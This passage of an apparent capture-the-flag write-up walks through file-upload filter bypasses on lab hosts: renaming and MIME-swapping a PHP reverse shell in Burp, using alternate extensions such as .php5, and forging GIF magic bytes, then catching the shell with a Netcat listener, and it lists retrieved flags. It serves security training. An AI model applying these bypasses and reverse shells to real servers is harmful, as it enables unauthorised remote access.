<p><img alt="Client-Side Uploads Folder" src="../../../assets/images/thm/uploadvulnerabilities/15%20-%20Client%20Side%20Bypass%20Upload%20Folder.png" /></p>
<p>Now that we know where our uploaded files are being stored, let's go ahead and upload our reverse shell. Like before, we will use the following <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">PHP reverse shell</a> with the IP address set to our current tun0 IP address and port <code>1234</code>.</p>
<p>Rename the reverse shell to have a file extension of <code>png</code> in order to bypass the client-side filter.</p>
<p>Let's open Burp Suite and configure our browser to use Burp Proxy. One the vulnerable web application, select our malicious file.</p>
<p><img alt="Client-Side Filter Bypass Shell Selected" src="../../../assets/images/thm/uploadvulnerabilities/16%20-%20Client%20Side%20Bypass%20Shell%20Selected.png" /></p>
<p>Ensure <em>Intercept</em> is <em>on</em> and click <em>Upload</em> on the web application to capture the request.Notice the file name and Content-Type in the request header.</p>
<p><img alt="Client-Side Filter Bypass Burp Intercept" src="../../../assets/images/thm/uploadvulnerabilities/17%20-%20Client%20Side%20Bypass%20Burp%20Intercept.png" /></p>
<p>Let's modify the filename from <code>shell.png</code> to <code>shell.php</code> and Content-Type from <code>image/png</code> to <code>text/x-php</code> and forward the request to the server.</p>
<p><img alt="Client-side Filter Bypass Burp Modification" src="../../../assets/images/thm/uploadvulnerabilities/18%20-%20Client%20Side%20Bypass%20Burp%20Modify%20MIME.png" /></p>
<p><img alt="Client-side Filter Bypass Malicious Upload Success" src="../../../assets/images/thm/uploadvulnerabilities/19%20-%20Client%20Side%20Bypass%20Malicious%20Upload%20Success.png" /></p>
<p>Let's get our our Netcat listener and execute the payload by navigating to the uploaded file located at: <code>http://java.uploadvulns.thm/images/shell.php</code></p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="gp">$ </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">1234</span>
</code></pre></div>
We have a shell and our flag.</p>
<p><img alt="Client-side Filter Bypass Reverse Shell" src="../../../assets/images/thm/uploadvulnerabilities/20%20-%20Client%20Side%20Bypass%20Reverse%20Shell.png" /></p>
<p><img alt="Client-side Filter Bypass Flag" src="../../../assets/images/thm/uploadvulnerabilities/21%20-%20Client%20Side%20Bypass%20Flag.png" /></p>
<p>Retrieved Flag: <code>THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}</code></p>
<h2 id="task-8-bypassing-server-side-filtering-file-extensions">Task 8 - Bypassing Server-Side Filtering: File Extensions<a class="headerlink" href="#task-8-bypassing-server-side-filtering-file-extensions" title="Permanent link">&para;</a></h2>
<p>Server-side filters are more difficult to bypass by comparison as we do not have access to the backend filter code. Bypassing server-side filters often involve and iterative process to test and build up a payload which conforms to the filter's restrictions.</p>
<p>Let's begin by looking at web applications that use a blacklist for file extensions as a server side filter. There are a variety of ways this could be coded and the bypass technique used is dependant on that. A simple example code for a blacklist file extension filter is presented below:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="c1">//Get the extension</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;fileToUpload&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">])[</span><span class="s2">&quot;extension&quot;</span><span class="p">];</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="c1">//Check the extension against the blacklist -- .php and .phtml</span>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>    <span class="k">switch</span><span class="p">(</span><span class="nv">$extension</span><span class="p">){</span>
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>        <span class="k">case</span> <span class="s2">&quot;php&quot;</span><span class="o">:</span>
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>        <span class="k">case</span> <span class="s2">&quot;phtml&quot;</span><span class="o">:</span>
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>        <span class="k">case</span> <span class="k">NULL</span><span class="o">:</span>
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>            <span class="nv">$uploadFail</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>            <span class="k">break</span><span class="p">;</span>
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>        <span class="k">default</span><span class="o">:</span>
<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>            <span class="nv">$uploadFail</span> <span class="o">=</span> <span class="k">False</span><span class="p">;</span>
<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>    <span class="p">}</span>
<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="cp">?&gt;</span>
</code></pre></div>
In the example above, the code is looking for the last period <code>.</code> in the file name and uses that to confirm the extension. Other ways the code could be working include: searching for the first period in the filename or splitting the file name at each period and checking to see if any blacklisted extensions show up.</p>
<p>In the example code above, we can see that the developers are filtering out <code>.php</code> and <code>.phtml</code> extensions so if an attacker wanted to upload a PHP script, another extension will need to be used. There are a variety of other more rarely used PHP extensions that web servers may recognize: <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.phps</code>, <code>.php-s</code>, <code>.pht</code>, and <code>.phar</code>. Many of these bypass the filter (which only blocks <code>.php</code> and <code>.phtml</code>). Note the other PHP extensions will only work if the server is configured to recognize them as PHP files otherwise the server  will simply attempt to display the content of the file without the server actually executing the file.</p>
<p>Now let's consider a black-box system where we don't have prior knowledge of the source code. The first steps are to enumerate what extensions are permitted and what extensions are blacklisted. Depending on how the filter is implemented, an attacker may be able to append a blacklisted extension to an allowed extension. For example, a server permits <code>.jpg</code> extension but filters out <code>.php</code> and all of its permutations, a simple payload may include modifying the accepted file extension with a blacklisted one (ie. modify <code>shell.jpg</code> to <code>shell.jpg.php</code>). This is not guaranteed to work as this is highly dependent on filter configuration but is a good start.</p>
<h4 id="practical-example_1">Practical Example<a class="headerlink" href="#practical-example_1" title="Permanent link">&para;</a></h4>
<p>Let's look at a practical example. Navigate to: <code>http://annex.uploadvulns.thm/</code></p>
<p>In the terminal box on the web application, type help to get the syntax required to select and upload a file.</p>
<p>Let's go ahead and select an image file and upload it. Using <code>feroxbuster</code> we can enumerate the host to find out that our uploaded files are being stored in the <code>/privacy</code> folder.</p>
<p><img alt="Server-side Filter Bypass Image Upload" src="../../../assets/images/thm/uploadvulnerabilities/22%20-%20Server%20Side%20Bypass%20Image%20Upload.png" /></p>
<p>Let's try uploading our PHP reverse shell.</p>
<p><img alt="Server-side Filter Bypass File Invalid" src="../../../assets/images/thm/uploadvulnerabilities/23%20-%20Server%20Side%20Bypass%20File%20Type%20Invalid.png" /></p>
<p>Looks like the extension <code>.php</code> is being filtered out. Iterating through the different PHP extensions, it seems that <code>.php5</code> is not being filtered and as such we are able to upload it to the server.</p>
<p><img alt="Server-side Filter Bypass PHP5 Upload Success" src="../../../assets/images/thm/uploadvulnerabilities/25%20-%20Server%20Side%20Bypass%20PHP5%20Success.png" /></p>
<p>Let's setup up our Netcat listener and execute the payload a: <code>http://annex.uploadvulns.thm/privacy</code></p>
<p><img alt="Server-side Filter Bypass Reverse Shell and Flag" src="../../../assets/images/thm/uploadvulnerabilities/26%20-%20Server%20Side%20Bypass%20Reverse%20Shell%20and%20Flag.png" /></p>
<p>Retrieved Flag: <code>THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}</code></p>
<h2 id="task-9-bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers<a class="headerlink" href="#task-9-bypassing-server-side-filtering-magic-numbers" title="Permanent link">&para;</a></h2>
<p>Magic numbers are used as more accurate identifiers for files. The magic numbers are a string of hexadecimal numbers which are always the very first thing in a file. With this knowledge, it is possible to use magic numbers to validate file uploads by simply reading those first few bytes and comparing them against either a whitelist or a blacklist. This can be very a technique against PHP based web servers however it can sometimes fail against other types of web servers.</p>
<p>Let's drive right into a practical example.</p>
<p>Trying to upload our PHP reverse shell, we get an error message that only GIFs are allowed.</p>
<p>Before doing anything else, let's run the <code>file</code> command on our PHP reverse shell.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">┌──(siachen㉿kali)-[/dev/shm]</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="go">└─$ file shell.php </span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="go">shell.php: PHP script, ASCII text</span>
</code></pre></div>
Here we notice that Linux identifies the file correctly as PHP file. We want to pass this file off as a JPEG so let's open up the PHP file and add 4 random placeholder characters to the beginning of the file. The reason we are adding 6 characters is because the magic number has the hex signature of <code>47 49 46 38 39 61</code>.</p>
<p><img alt="Magic Number Bypass GIF Signature" src="../../../assets/images/thm/uploadvulnerabilities/27%20-%20Magic%20Number%20Bypass%20GIF%20Signature.png" /></p>
<p>Now open the file in <code>hexeditor</code> and replace the placeholder characters with the hex signature for a GIF.</p>
<p><img alt="Magic Number Bypass GIF Hex Signature" src="../../../assets/images/thm/uploadvulnerabilities/28%20-%20Magic%20Number%20Bypass%20GIF%20Hex%20Sig.png" /></p>
<p>Running <code>File</code> on <code>shell.php</code> we notice that the Linux now recognizes it as a GIF instead of a PHP file.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="go">┌──(siachen㉿kali)-[/dev/shm]</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="go">└─$ file shell.php</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="go">shell.php: GIF image data, version 89a, 15370 x 28735</span>
</code></pre></div>
Let's select and upload our file to the server.</p>
<p><img alt="Magic Number Bypass File Upload Success" src="../../../assets/images/thm/uploadvulnerabilities/29%20-%20Magic%20Number%20Bypass%20Upload%20Success.png" /></p>
<p>We now need to figure out where the file was uploaded to. We can again use <code>feroxbuster</code> to enumerate the host and find possible locations. Most likely place found by <code>feroxbuster</code> appear to be a directory called <code>/graphics</code> but it looks like directory indexing is disabled. We will have to execute the shell by navigating directly to the uploaded file at: <code>http://magic.uploadvulns.thm/graphics/shell.php</code></p>
<p><img alt="Magic Number Bypass Reverse Shell and Flag" src="../../../assets/images/thm/uploadvulnerabilities/30%20-%20Magic%20Number%20Bypass%20Success%20and%20Flag.png" /></p>
<p>Retrieved Flag: <code>THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}</code></p>
<h2 id="task-10-example-methodology">Task 10 - Example Methodology<a class="headerlink" href="#task-10-example-methodology" title="Permanent link">&para;</a></h2>
<p>Following is a basic methodology on how to approach the task of file upload filter bypass.</p>
<ol>
<li>Look at the web application as a whole to determine what languages and frameworks the web application might have been built with. HTTP request headers intercepted by Burp Suite can provide valuable information about the server.</li>
<li>Enumerate the host using tools like <code>feroxbuster</code> to look for attack vectors such as an uploads page.</li>
<li>Analyze source-code for the web application for any client-side scripts implementing client-side filters.</li>
<li>Upload an innocent file and figure out how the uploaded file can be be accessed. This serves to create a baseline accepted file which can be used for further testing. An important switch in <code>feroxbuster</code> is <code>-x</code> which can be used to look for files with specific file extensions like <code>.php</code>, <code>.txt</code>, and <code>.html</code>. This can be quite useful if an attacker has managed to upload a payload and the server is changing the name of uploaded files.</li>
<li>Having ascertained how and where uploaded files are being accessed, attempt a malicious file upload. Any error messages encountered during filter bypass attempts can provide valuable information on the kind of filter being employed.</li>
</ol>
<p>Assuming that our malicious upload was stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:</p>
<ol>
<li>If you can successfully upload a file with a completely invalid/random file extension (ie. image.invalidfileformat) then the chances are that the server is using an extension <strong><em>blacklist</em></strong> filter. If this file upload fails then a <strong><em>whitelist</em></strong> filter is being employed.</li>
<li>Try re-uploading an innocent file accepted by the server but change the magic number to be something you would expect to be filtered. If the upload fails then the server is employing <strong><em>magic number</em></strong> based filter.</li>
<li>As with the previous attempt, try uploading and innocent file accepted by the server but intercept the request with Burp Suite and modify the MIME type (Content-Type) to something that you would expect to be filtered. If the upload fails then the server is filtering on <strong><em>MIME</em></strong> types.</li>
<li>Enumerate file length filters by uploading progressively bigger files until you hit the filter limit. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using throughout this room.</li>
</ol>
<h2 id="task-11-challenge">Task 11 - Challenge<a class="headerlink" href="#task-11-challenge" title="Permanent link">&para;</a></h2>
<p>Let's apply everything we've learnt so far to retrieve a flag from <code>/var/www/</code>.</p>
<p>Navigate to <code>http://jewel.uploadvulns.thm</code> and begin enumerating the host for more information.</p>
<p>Looking at the page source code, we notice a Javascript file named <code>upload.js</code>.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">errorTimeout</span><span class="p">;</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">fadeSpeed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setResponseMsg</span><span class="p">(</span><span class="nx">responseTxt</span><span class="p">,</span><span class="w"> </span><span class="nx">colour</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#responseMsg&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">responseTxt</span><span class="p">);</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#responseMsg&#39;</span><span class="p">).</span><span class="nx">is</span><span class="p">(</span><span class="s1">&#39;:visible&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">      </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#responseMsg&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">({</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">        </span><span class="s1">&#39;color&#39;</span><span class="o">:</span><span class="w"> </span><span class="nx">colour</span>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">      </span><span class="p">}).</span><span class="nx">fadeIn</span><span class="p">(</span><span class="nx">fadeSpeed</span><span class="p">)</span>
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">      </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#responseMsg&#39;</span><span class="p">).</span><span class="nx">animate</span><span class="p">({</span>
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">        </span><span class="nx">color</span><span class="o">:</span><span class="w"> </span><span class="nx">colour</span>
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">      </span><span class="p">},</span><span class="w"> </span><span class="nx">fadeSpeed</span><span class="p">)</span>
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">    </span><span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">errorTimeout</span><span class="p">);</span>
<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="w">    </span><span class="nx">errorTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;{</span>
<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="w">      </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#responseMsg&#39;</span><span class="p">).</span><span class="nx">fadeOut</span><span class="p">(</span><span class="nx">fadeSpeed</span><span class="p">)</span>
<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">5000</span><span class="p">)</span>
<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="w">  </span><span class="p">}</span>
<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#uploadBtn&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fileSelect&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">()</span>
<a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="w">  </span><span class="p">});</span>
<a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fileSelect&#39;</span><span class="p">).</span><span class="nx">change</span><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">fileBox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;fileSelect&#39;</span><span class="p">).</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FileReader</span><span class="p">();</span>
<a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="w">    </span><span class="nx">reader</span><span class="p">.</span><span class="nx">readAsDataURL</span><span class="p">(</span><span class="nx">fileBox</span><span class="p">);</span>
<a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a><span class="w">    </span><span class="nx">reader</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="w">      </span><span class="c1">//Check File Size</span>
<a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">50</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1024</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a><span class="w">        </span><span class="nx">setResponseMsg</span><span class="p">(</span><span class="s1">&#39;File too big&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;red&#39;</span><span class="p">);</span>
<a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a><span class="w">      </span><span class="p">}</span><span class="w">      </span><span class="c1">//Check Magic Number</span>
<a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a>
<a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">]).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;ÿØÿ&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a><span class="w">        </span><span class="nx">setResponseMsg</span><span class="p">(</span><span class="s1">&#39;Invalid file format&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;red&#39;</span><span class="p">);</span>
<a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a><span class="w">      </span><span class="p">}</span><span class="w">      </span><span class="c1">//Check File Extension</span>
<a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a>
<a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">extension</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fileBox</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">].</span><span class="nx">toLowerCase</span><span class="p">();</span>
<a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">extension</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;jpg&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">extension</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;jpeg&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a><span class="w">        </span><span class="nx">setResponseMsg</span><span class="p">(</span><span class="s1">&#39;Invalid file format&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;red&#39;</span><span class="p">);</span>
<a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a><span class="w">      </span><span class="p">}</span>
<a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-45" name="__codelineno-10-45" href="#__codelineno-10-45"></a><span class="w">        </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;File successfully uploaded&#39;</span><span class="p">,</span>
<a id="__codelineno-10-46" name="__codelineno-10-46" href="#__codelineno-10-46"></a><span class="w">        </span><span class="nx">failure</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;No file selected&#39;</span><span class="p">,</span>
<a id="__codelineno-10-47" name="__codelineno-10-47" href="#__codelineno-10-47"></a><span class="w">        </span><span class="nx">invalid</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Invalid file type&#39;</span>
<a id="__codelineno-10-48" name="__codelineno-10-48" href="#__codelineno-10-48"></a><span class="w">      </span><span class="p">};</span>
<a id="__codelineno-10-49" name="__codelineno-10-49" href="#__codelineno-10-49"></a><span class="w">      </span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-50" name="__codelineno-10-50" href="#__codelineno-10-50"></a><span class="w">        </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<a id="__codelineno-10-51" name="__codelineno-10-51" href="#__codelineno-10-51"></a><span class="w">          </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">fileBox</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
<a id="__codelineno-10-52" name="__codelineno-10-52" href="#__codelineno-10-52"></a><span class="w">          </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">fileBox</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span>
<a id="__codelineno-10-53" name="__codelineno-10-53" href="#__codelineno-10-53"></a><span class="w">          </span><span class="nx">file</span><span class="o">:</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span>
<a id="__codelineno-10-54" name="__codelineno-10-54" href="#__codelineno-10-54"></a><span class="w">        </span><span class="p">}),</span>
<a id="__codelineno-10-55" name="__codelineno-10-55" href="#__codelineno-10-55"></a><span class="w">        </span><span class="nx">contentType</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
<a id="__codelineno-10-56" name="__codelineno-10-56" href="#__codelineno-10-56"></a><span class="w">        </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<a id="__codelineno-10-57" name="__codelineno-10-57" href="#__codelineno-10-57"></a><span class="w">        </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-58" name="__codelineno-10-58" href="#__codelineno-10-58"></a><span class="w">          </span><span class="kd">let</span><span class="w"> </span><span class="nx">colour</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<a id="__codelineno-10-59" name="__codelineno-10-59" href="#__codelineno-10-59"></a><span class="w">          </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-10-60" name="__codelineno-10-60" href="#__codelineno-10-60"></a><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;success&#39;</span><span class="o">:</span>
<a id="__codelineno-10-61" name="__codelineno-10-61" href="#__codelineno-10-61"></a><span class="w">              </span><span class="nx">colour</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;green&#39;</span><span class="p">;</span>
<a id="__codelineno-10-62" name="__codelineno-10-62" href="#__codelineno-10-62"></a><span class="w">              </span><span class="k">break</span><span class="p">;</span>
<a id="__codelineno-10-63" name="__codelineno-10-63" href="#__codelineno-10-63"></a><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;failure&#39;</span><span class="o">:</span>
<a id="__codelineno-10-64" name="__codelineno-10-64" href="#__codelineno-10-64"></a><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;invalid&#39;</span><span class="o">:</span>
<a id="__codelineno-10-65" name="__codelineno-10-65" href="#__codelineno-10-65"></a><span class="w">              </span><span class="nx">colour</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;red&#39;</span><span class="p">;</span>
<a id="__codelineno-10-66" name="__codelineno-10-66" href="#__codelineno-10-66"></a><span class="w">              </span><span class="k">break</span>
<a id="__codelineno-10-67" name="__codelineno-10-67" href="#__codelineno-10-67"></a><span class="w">          </span><span class="p">}</span>
